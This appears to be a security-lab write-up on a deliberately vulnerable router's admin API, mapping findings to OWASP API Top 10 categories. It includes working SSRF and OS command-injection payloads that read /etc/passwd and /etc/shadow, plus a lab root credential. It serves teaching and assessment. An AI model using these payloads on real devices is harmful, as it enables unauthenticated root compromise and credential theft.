---
id: "ROUTCOON-API"
title: "RoutCoon Router Internal API Vulnerabilities (OWASP API Security Top 10 2023)"
category: API
status: IN PROGRESS
severity: "Critical to Medium (per finding)"
owasp: "OWASP API Security Top 10 2023: API2 Broken Authentication, API5 Broken Function-Level Authorization, API7 Server-Side Request Forgery, API8 Security Misconfiguration, API9 Improper Inventory Management"
cwe:
  - "CWE-307 Improper Restriction of Excessive Authentication Attempts, CWE-352 Cross-Site Request Forgery, CWE-620 Unverified Password Change (API2)"
  - "CWE-918 Server-Side Request Forgery (API7)"
  - "CWE-78 Improper Neutralization of Special Elements used in an OS Command (API8)"
  - "CWE-285 Improper Authorization, CWE-862 Missing Authorization (API5)"
  - "CWE-1059 Insufficient Documentation, CWE-489 Active Debug Code (API9)"
affected_components:
  - "labs/routcoon/files/usr/lib/lua/luci/dispatcher.lua"
  - "labs/routcoon/files/usr/lib/lua/luci/model/cbi/admin_system/admin.lua"
  - "labs/routcoon/files/usr/lib/lua/luci/controller/network_tools.lua"
  - "labs/routcoon/files/usr/lib/lua/luci/controller/admin/network.lua"
  - "labs/routcoon/files/usr/lib/lua/luci/controller/iotgoat/iotgoat.lua"
  - "labs/routcoon/files/etc/config/luci"
findings:
  - "API2: DONE"
  - "API7: DONE"
  - "API8: DONE"
  - "API8 IoTGoat webcmd console (CWE-78): DONE"
  - "network_tools check RCE (CWE-78) + status SSRF (CWE-918): DONE"
  - "API5: DONE"
  - "API9: DONE"
---

# Introduction
In this section we are analyzing the vulnerabilities present in the internal API of the vulnerable home router. This API is used for administration purposes, and it is accessible from the local network in `http://192.168.2.1:80`.

# API2:2023 Broken Authentication

The authentication mechanism of our API for managing the router detects some key characteristics typical of *inadequate authentication*.

## 1. Vulnerable session management

In the session creation function, there is no rate limiting or protection against brute force attacks:
```lua
local function session_setup(user, pass, allowed_users)

	if util.contains(allowed_users, user) then

		local login = util.ubus("session", "login", {

			username = user,

			password = pass,

			timeout = tonumber(luci.config.sauth.sessiontime)

		})
```

## 2. Weak token generation
```lua
util.ubus("session", "set", {

		ubus_rpc_session = login.ubus_rpc_session,

		values = { token = sys.uniqueid(16) }
})
```

## 3. Insufficient validation

There is no validation of the origin of the CSRF token.

```lua
function test_post_security()

	if http.getenv("REQUEST_METHOD") ~= "POST" then
		http.status(405, "Method Not Allowed")
		http.header("Allow", "POST")
		return false
	end
	
	if http.formvalue("token") ~= context.authtoken then
		http.status(403, "Forbidden")
		luci.template.render("csrftoken")
		return false
	end

	return true
end
```

The session to be returned is also not properly verified:
```lua
local function session_retrieve(sid, allowed_users)

	local sdat = util.ubus("session", "get", { ubus_rpc_session = sid })
	
	  
	
	if type(sdat) == "table" and
		type(sdat.values) == "table" and
		type(sdat.values.token) == "string" and
		(not allowed_users or
		util.contains(allowed_users, sdat.values.username))
	then
		uci:set_session_id(sid)
		return sid, sdat.values
	end
	return nil, nil
end
```

The source IP address is not verified, nor is the token expiration date or the consistency of the User-Agent.

## Lack of current password validation

The code allows the administrator password to be changed **without verifying the current password.** It relies entirely on the authentication that has already been performed to access the administration panel.
```lua
function m.parse(map)
    local v1 = pw1:formvalue("_pass")
    local v2 = pw2:formvalue("_pass")

    if v1 and v2 and #v1 > 0 and #v2 > 0 then
        if v1 == v2 then
            -- VULNERABILITY: Changes the password without verifying the current one
            if luci.sys.user.setpasswd(luci.dispatcher.context.authuser, v1) == 0 then
                m.message = translate("Password successfully changed!")
            else
                m.message = translate("Unknown Error, password not changed!")
            end
        else
            m.message = translate("Given password confirmation did not match, password not changed!")
        end
    end

    Map.parse(map)
end
```

![[iot2_router_password_change.png]]

This vulnerability also matches with [[#API8:2023 Security Misconfiguration]] as it is a design decision of the manufacturer not implementing a security standard control for this function.
# API7:2023 Server Side Request Forgery

The developer left a file for debugging and testing the connection to different points in the system to see if URL evaluations and connections within the same network were working. To do this, they registered the endpoints with `sysauth = false` in the dispatcher (`dispatcher.lua`), outside the authenticated `admin/*` tree, so no authentication is required to use them.

```lua
function index()
	local api_node = entry({"api"}, firstchild(), _("API"), 10)
	api_node.sysauth = false
	
	local v1_node = entry({"api", "v1"}, firstchild(), _("API v1"), 20)
	v1_node.sysauth = false
	
	local check_node = entry({"api", "v1", "check"}, call("check_service"), _("Network Service Check"), 60)
	check_node.sysauth = false
	
	local ping_node = entry({"api", "v1", "ping"}, call("ping_host"), _("Ping Host"), 61)
	ping_node.sysauth = false
	
	local status_node = entry({"api", "v1", "status"}, call("service_status"), _("Service Status"), 62)
	status_node.sysauth = false
	
	local tools_node = entry({"tools"}, firstchild(), _("Tools"), 30)
	tools_node.sysauth = false
	
	local ping_simple = entry({"tools", "ping"}, call("ping_host"), _("Ping Tool"), 70)
	ping_simple.sysauth = false
	
	local check_simple = entry({"tools", "check"}, call("check_service"), _("Network Check"), 71)
	check_simple.sysauth = false
end
```

Furthermore, if we list the installed tools and packages, we can see that *curl* was left installed during the development phase, most likely to carry out these tests.

Using this entry, we can see that the server receives requests and reports results:

```shell
❯ curl -X GET "http://192.168.2.1/cgi-bin/luci/api/v1/check?url=file:///etc/passwd"
{"vulnerability":"SSRF_WITHOUT_AUTH","requester":"192.168.1.2","timestamp":1750736334,"status":"success","url":"file:\/\/\/etc\/passwd","headers":[],"response":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0root:x:0:0:root:\/root:\/bin\/ash\nntp:x:123:123:ntp:\/var\/run\/ntp:\/bin\/false\ndnsmasq:x:453:453:dnsmasq:\/var\/run\/dnsmasq:\/bin\/false\nlogd:x:514:514:logd:\/var\/run\/logd:\/bin\/false\nubus:x:81:81:ubus:\/var\/run\/ubus:\/bin\/false\nnetwork:x:101:101:network:\/var\/run\/network:\/bin\/false\nopenwrtuser:x:1000:1000:root:\/root:\/bin\/ash\nanonymous:x:1001:1001::\/tmp\/ftp:\/bin\/ash\nnobody:x:1002:1002::\/var:\/bin\/false\n\r100   390  100   390    0     0   455k      0 --:--:-- --:--:-- --:--:--  380k\n"}%
```

In this case, it is reported that the user has successfully discovered the vulnerability.
The command injection reachable through this SSRF is documented as OS command injection under [[#API8:2023 Security Misconfiguration]], since the two form a chain: SSRF for access, command injection for code execution.

## Additional unauthenticated sinks in network_tools.lua

Two more `sysauth = false` handlers in the same file are stronger than the `file://` read above and are not covered by the `diag_ping` chain.

### `/api/v1/check` is directly command-injectable (no pivot needed)

`check_service` passes the `url` parameter into a single-quoted shell command with no sanitization:

```lua
local url = http.formvalue("url") or http.formvalue("service_url")
-- perform_http_request():
local cmd = string.format("curl -m %d '%s' 2>&1", timeout or 5, url)
local handle = io.popen(cmd)
```

A single quote in `url` closes the quoting and injects a command. Because the node is `sysauth = false`, this is unauthenticated RCE over a plain GET (no session, no CSRF token), and it does not need the `diag_ping` pivot the section above describes:

```shell
curl -G "http://192.168.2.1/cgi-bin/luci/api/v1/check" \
  --data-urlencode "url=x';id;'"
# curl runs the command built as: curl -m 5 'x';id;'' 2>&1
# the injected `id` runs as root; its output comes back in the JSON "response" field
```

By contrast `ping_host` (`/api/v1/ping`, `/tools/ping`) filters shell metacharacters, so the clean unauthenticated injection is `check`, not `ping`.

### `/api/v1/status` is a second SSRF (`internal_url`)

`service_status` fetches any URL passed in `internal_url`, server-side and unauthenticated (it even logs it as `critical`):

```lua
local internal_url = http.formvalue("internal_url")
if internal_url then
    services.custom = check_internal_service(internal_url)  -- -> perform_http_request()
    nixio.syslog("critical", string.format("UNAUTHENTICATED internal access from %s to %s", ...))
```

```shell
curl -G "http://192.168.2.1/cgi-bin/luci/api/v1/status" \
  --data-urlencode "internal_url=http://127.0.0.1:80/cgi-bin/luci/admin/system/admin"
# reaches internal-only services from an unauthenticated request, response returned inline
```

**OWASP / CWE.** The `check` command injection is CWE-78 (under API8:2023); the `status` SSRF is CWE-918 (under API7:2023). Both are unauthenticated. Live confirmation (the injected `id` output in the JSON, an internal fetch echoed back) wants a flashed image.
# API8:2023 Security Misconfiguration

## OS Command Injection in Network Diagnostics (RCE)

The *Network > Diagnostics* page runs *ping*, *traceroute* and *nslookup*. The handler `diag_ping` is defined in `controller/admin/network.lua` (not in `network_tools.lua`) and is registered with `call()`, so it accepts both GET and POST:
```lua
138: page = entry({"admin", "network", "diag_ping"}, call("diag_ping"), nil)
```

![[api8_diag_ping.png]]

`diag_ping` passes the user-supplied address straight into a shell through `diag_command`, with input validation and `shellquote` both commented out:
```lua
local util = io.popen(string.format("ping -c 5 -W 1 %s", addr))
```

Every character reaches the shell, so an address such as `192.168.2.1; id` runs an arbitrary command after the ping. Reaching this handler still needs the *sysauth* cookie. The unauthenticated tool routes in *network_tools.lua* (`tools/ping`, `api/v1/ping`) do not help here because they apply a character filter, so the clean injection is the unfiltered `diag_ping`, which the SSRF primitive above is used to reach.

![[api7_discovering_command_injection.png]]

One exploitation caveat: the front-end sends the address as a URL path segment (`/admin/network/diag_ping/<addr>`), and the LuCI dispatcher splits the path on `/`. A payload like `cat /etc/passwd` is cut at the first `/`, so `diag_ping` receives only `192.168.2.1; cat ` and `cat`, left without a filename, reads standard input (the POST body carrying the CSRF token) instead of a file. This is a routing artefact, not input filtering. `diag_command` performs no validation at all. Sending the payload in the request body as `host=192.168.2.1; cat /etc/passwd` avoids the split, because `diag_ping` falls back to `formvalue("host")`.

![[api7_rce_command_injection.png]]

This Remote Code Execution opens the door to local file disclosure, file upload and reverse shells.

**OWASP mapping.** This is OS command injection (CWE-78), not SSRF (CWE-918). In the OWASP API Security Top 10 2023 injection is no longer a standalone entry (it was *API8:2019 Injection*) and now sits under **API8:2023 Security Misconfiguration**. Treat it as a chain: **API7 SSRF (access) -> API8 command injection (RCE)**.

## OS Command Injection via the IoTGoat developer console

A second, cleaner command-injection sink lives in `controller/iotgoat/iotgoat.lua`, a leftover IoTGoat developer console registered under the authenticated `admin/*` tree:

```lua
entry({"admin", "iotgoat", "cmdinject"}, template("iotgoat/cmd"), "", 1)
entry({"admin", "iotgoat", "webcmd"}, call("webcmd"))
```

The `cmdinject` page (`view/iotgoat/cmd.htm`, titled "Secret Developer Diagnostics Page", legend "Execute commands or scripts as root") is a console that POSTs a `cmd` parameter to the `webcmd` handler, which passes it straight to a shell with no validation of any kind:

```lua
function webcmd()
    local cmd = http.formvalue("cmd")
    if cmd then
        local fp = io.popen(tostring(cmd).." 2>&1")
```

Unlike `diag_ping`, there is no character filter and no path-split artefact, and LuCI/uhttpd runs as root, so `cmd` executes as root verbatim. `id; cat /etc/shadow` runs both commands.

### Authentication

These entries inherit the admin tree's `page.sysauth = "root"` (`controller/admin/index.lua`), so `admin/iotgoat/webcmd` requires an authenticated root LuCI session. It is not unauthenticated: reach it with the white-box `root:uncrackable` credential, or by first chaining the unauthenticated SSH-key injection (see IoT5) to a root shell. Once authenticated it is a direct, clean root RCE, stronger than the `diag_ping` path.

### Reproduction

Log in to LuCI as `root`, open the console at `http://192.168.2.1/cgi-bin/luci/admin/iotgoat/cmdinject`, and type a command (it POSTs to `webcmd` and prints the output). The scripted equivalent, with the authenticated session cookie:

```shell
curl -s "http://192.168.2.1/cgi-bin/luci/admin/iotgoat/webcmd" \
  -b "sysauth=<your-session>" --data-urlencode "cmd=id; cat /etc/shadow"
# -> uid=0(root) gid=0(root) ... plus the contents of /etc/shadow
```

### Non-functional siblings

The same controller registers `admin/iotgoat/cam` (Camera) and `admin/iotgoat/door` (Doorlock), but their templates (`view/iotgoat/camera.htm`, `door.htm`) are empty `PLACEHOLDER` stubs with no backend, so they are menu entries only, not working attack surface.

**OWASP / CWE.** OS command injection, CWE-78, under API8:2023 Security Misconfiguration (a leftover debug interface). Post-authentication root RCE.

# API5:2023 Broken Function-Level Authorization

The internal API exposes privileged functions with no function-level authorization: several handlers that perform administrative or root-level operations are registered with `sysauth = false` (or gated only by a generic session), so a caller reaches the function without holding the role it requires.

| Function | Route | Auth | Operation |
|----------|-------|------|-----------|
| Network check (SSRF + shell) | `api/v1/check`, `tools/check` | none (`sysauth=false`) | server-side fetch, plus command injection via the single-quoted `curl` |
| Internal service probe (SSRF) | `api/v1/status` | none | fetches any `internal_url` server-side |
| SSH key provisioning | `support/remote/diagnostic` | none (spoofable-IP "auth") | writes `/etc/dropbear/authorized_keys` |
| Root command console | `admin/iotgoat/webcmd` | generic admin session only | runs any command as root |

None of these enforce that the caller is authorized for the privileged action: the diagnostic and SSH-provisioning functions require no session at all, and the IoTGoat console is reachable by any authenticated session rather than a dedicated privileged role. This is broken function-level authorization: sensitive functions exposed to callers who should not reach them. The concrete repros live under API7 (SSRF), API8 (command injection and the IoTGoat console), and IoT5 (the SSH-key injection).

**OWASP / CWE.** API5:2023 Broken Function-Level Authorization; CWE-285 Improper Authorization; CWE-862 Missing Authorization.

# API9:2023 Improper Inventory Management

The API ships leftover development and debug endpoints in what is presented as a production router, with no inventory of them and no link from the UI:

- `support/remote/diagnostic`, a "support" tool with a `?debug=1` environment dump (see IoT5),
- `api/v1/status` and the wider unauthenticated `api/v1/*` and `tools/*` tree,
- the `admin/iotgoat/*` console (`cmdinject`, `webcmd`, plus the dead `cam`/`door` stubs).

These undocumented, unmanaged endpoints are the surface API9 warns about: the endpoint-discovery fuzzing in IoT3/IoT5 enumerates them, and they expose far more capability (unauthenticated RCE, SSRF, SSH provisioning) than the documented `admin/*` interface admits. There is no versioning, deprecation, or inventory that would flag them for removal.

**OWASP / CWE.** API9:2023 Improper Inventory Management; CWE-1059 Insufficient Documentation; CWE-489 Active Debug Code.
